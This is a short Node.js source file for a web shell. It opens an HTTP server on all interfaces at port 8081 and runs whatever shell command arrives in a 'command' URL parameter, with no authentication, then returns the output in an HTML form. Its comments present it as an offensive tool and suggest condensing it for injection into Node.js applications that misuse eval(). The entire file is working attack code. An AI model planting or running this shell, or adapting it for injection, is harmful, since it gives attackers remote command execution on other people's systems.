/* Tried to create with as little dependencies as possible. 
These two modules come with a nodejs install so if nodejs is on the system then no further installs should be required
This shell is started with 'node web-shell.js'. May not be extremely useful in real world situation but its here just in case
This code can also be condensed and slightly changed to be injected into a vulnerable nodejs application that is using something like eval()
Will include the eval() injection code later
*/
const http = require('http');
const { exec } = require('child_process');

//Create server
http.createServer(function (request, response) {

  //Check for url
  if (request.url.indexOf('/cmd') != -1) {


	   if(request.url.indexOf('action_page.php?command=') != -1){
	   		var command = decodeURIComponent(request.url.split("command=")[1]).replace(/\+/g," ");

	   		//Execute command and send back output and html form
			exec(command, (err, stdout, stderr) => {
				response.writeHead(200, {'Content-Type': 'text/html'});
				response.end('<html><body><form action="/cmd/action_page.php" method="GET">Command:<input type="text" name="command" placeholder="enter command"><br><input type="submit" value="Submit"></form><pre>'+stdout+'<br>'+stderr+'</pre></body></html>');

			});
	   } else {
	   	response.writeHead(200, {'Content-Type': 'text/html'});
	   
	   	//send html form
	   	response.end('<html><body><form action="/cmd/action_page.php" method="GET">Command:<input type="text" name="command" placeholder="enter command"><br><input type="submit" value="Submit"></form></body></html>');
	   }

  } else {
  	response.writeHead(404);
  	response.end();
  }




}).listen(8081, '0.0.0.0');//Listen on Any

console.log('Web shell is listening at http://some.ip.on.machine:8081/cmd');